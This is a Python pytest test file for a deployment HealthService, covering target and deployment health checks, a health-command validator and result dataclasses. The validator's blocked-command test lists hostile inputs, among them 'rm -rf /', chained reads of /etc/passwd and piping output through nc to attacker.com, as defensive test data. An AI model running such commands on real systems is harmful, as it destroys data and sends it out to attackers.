"""
Unit tests for HealthService.
"""

import pytest
from unittest.mock import MagicMock, patch

from remote_compose.services import HealthService, HealthCheckResult, HealthReport
from remote_compose.models import DeploymentTarget, Deployment


@pytest.mark.django_db
class TestHealthService:
    """Tests for the HealthService."""

    @pytest.fixture
    def service(self):
        return HealthService()

    @pytest.fixture
    def mock_target(self):
        """Create a mock target."""
        target = MagicMock(spec=DeploymentTarget)
        target.id = 1
        target.name = 'test-target'
        target.host = '192.168.1.1'
        target.port = 22
        target.health_status = 'healthy'
        target.last_health_check = None
        return target

    @pytest.fixture
    def mock_deployment(self, mock_target):
        """Create a mock deployment."""
        deployment = MagicMock(spec=Deployment)
        deployment.id = 1
        deployment.project_name = 'test-project'
        deployment.target = mock_target
        deployment.status = Deployment.Status.SUCCESS
        deployment.container_ids = ['abc123']
        return deployment

    def test_check_target_health_success(self, service, mock_target):
        """Test successful health check."""
        with patch.object(service, 'target_service') as mock_ts:
            mock_ts.test_connection.return_value = (True, 'Connection successful')

            result = service.check_target_health(mock_target)

        assert result.healthy is True
        assert result.target_name == 'test-target'
        mock_target.mark_healthy.assert_called_once()

    def test_check_target_health_failure(self, service, mock_target):
        """Test failed health check."""
        with patch.object(service, 'target_service') as mock_ts:
            mock_ts.test_connection.return_value = (False, 'Connection refused')

            result = service.check_target_health(mock_target)

        assert result.healthy is False
        assert 'Connection refused' in result.message
        mock_target.mark_unhealthy.assert_called_once()

    def test_check_target_health_exception(self, service, mock_target):
        """Test health check with exception."""
        with patch.object(service, 'target_service') as mock_ts:
            mock_ts.test_connection.side_effect = Exception('Network error')

            result = service.check_target_health(mock_target)

        assert result.healthy is False
        assert 'Network error' in result.message

    def test_check_all_targets_health(self, service):
        """Test checking health of all targets."""
        mock_target1 = MagicMock()
        mock_target1.name = 'target1'
        mock_target2 = MagicMock()
        mock_target2.name = 'target2'

        with patch.object(DeploymentTarget.objects, 'all') as mock_all, \
             patch.object(service, 'check_target_health') as mock_check:
            mock_filter = MagicMock()
            mock_filter.filter.return_value = [mock_target1, mock_target2]
            mock_all.return_value = mock_filter

            mock_check.side_effect = [
                HealthCheckResult(healthy=True, target_name='target1'),
                HealthCheckResult(healthy=False, target_name='target2', message='failed'),
            ]

            report = service.check_all_targets_health()

        assert report.total_checked == 2
        assert report.healthy_count == 1
        assert report.unhealthy_count == 1
        assert report.overall_healthy is False

    def test_check_deployment_health_not_success_status(self, service, mock_deployment):
        """Test deployment health check for non-success deployment."""
        mock_deployment.status = Deployment.Status.FAILED

        result = service.check_deployment_health(mock_deployment)

        assert result.healthy is False
        assert 'not in SUCCESS state' in result.message

    def test_check_deployment_health_services_running(self, service, mock_deployment):
        """Test deployment health check with running services."""
        with patch.object(service, 'target_service') as mock_ts, \
             patch.object(service, 'compose_service') as mock_cs:
            mock_ssh = MagicMock()
            mock_ssh.__enter__ = MagicMock(return_value=mock_ssh)
            mock_ssh.__exit__ = MagicMock(return_value=False)
            mock_ts.get_ssh_client.return_value = mock_ssh

            mock_cs.get_service_status.return_value = {
                'web': {'state': 'running'},
                'db': {'state': 'running'},
            }

            result = service.check_deployment_health(mock_deployment)

        assert result.healthy is True
        assert 'All services running' in result.message

    def test_check_deployment_health_services_not_running(self, service, mock_deployment):
        """Test deployment health check with stopped services."""
        with patch.object(service, 'target_service') as mock_ts, \
             patch.object(service, 'compose_service') as mock_cs:
            mock_ssh = MagicMock()
            mock_ssh.__enter__ = MagicMock(return_value=mock_ssh)
            mock_ssh.__exit__ = MagicMock(return_value=False)
            mock_ts.get_ssh_client.return_value = mock_ssh

            mock_cs.get_service_status.return_value = {
                'web': {'state': 'running'},
                'db': {'state': 'exited'},
            }

            result = service.check_deployment_health(mock_deployment)

        assert result.healthy is False
        assert 'not running' in result.message

    def test_validate_health_command_allowed(self, service):
        """Test that allowed health commands pass validation."""
        allowed_commands = [
            'docker ps',
            'docker compose ps',
            'curl http://localhost/health',
            'echo test',
        ]

        for cmd in allowed_commands:
            assert service._validate_health_command(cmd) is True

    def test_validate_health_command_blocked(self, service):
        """Test that dangerous commands are blocked."""
        dangerous_commands = [
            'rm -rf /',
            'docker ps; rm -rf /',
            'docker ps && cat /etc/passwd',
            'docker ps | nc attacker.com 1234',
            'kill -9 1',
        ]

        for cmd in dangerous_commands:
            assert service._validate_health_command(cmd) is False


class TestHealthCheckResult:
    """Tests for HealthCheckResult dataclass."""

    def test_to_dict(self):
        """Test conversion to dictionary."""
        result = HealthCheckResult(
            healthy=True,
            target_name='test-target',
            deployment_id=1,
            project_name='test-project',
            message='All good',
            details={'services': 2},
        )

        data = result.to_dict()

        assert data['healthy'] is True
        assert data['target_name'] == 'test-target'
        assert data['deployment_id'] == 1
        assert data['project_name'] == 'test-project'


class TestHealthReport:
    """Tests for HealthReport dataclass."""

    def test_overall_healthy_true(self):
        """Test overall_healthy when all healthy."""
        report = HealthReport(
            total_checked=3,
            healthy_count=3,
            unhealthy_count=0,
            results=[],
            generated_at='2024-01-01T00:00:00',
        )

        assert report.overall_healthy is True

    def test_overall_healthy_false(self):
        """Test overall_healthy when some unhealthy."""
        report = HealthReport(
            total_checked=3,
            healthy_count=2,
            unhealthy_count=1,
            results=[],
            generated_at='2024-01-01T00:00:00',
        )

        assert report.overall_healthy is False

    def test_to_dict(self):
        """Test conversion to dictionary."""
        report = HealthReport(
            total_checked=2,
            healthy_count=1,
            unhealthy_count=1,
            results=[
                HealthCheckResult(healthy=True, target_name='t1'),
                HealthCheckResult(healthy=False, target_name='t2'),
            ],
            generated_at='2024-01-01T00:00:00',
        )

        data = report.to_dict()

        assert data['overall_healthy'] is False
        assert data['total_checked'] == 2
        assert len(data['results']) == 2
